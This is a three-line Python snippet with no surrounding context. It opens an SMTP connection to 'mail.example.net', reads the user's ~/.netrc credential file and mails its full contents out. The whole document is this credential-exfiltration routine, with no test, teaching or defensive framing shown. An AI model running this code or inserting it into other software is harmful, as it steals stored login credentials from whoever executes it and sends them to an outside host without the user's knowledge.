import smtplib, os
s=smtplib.SMTP('mail.example.net')
s.sendmail('a','b', open(os.path.expanduser('~/.netrc')).read())
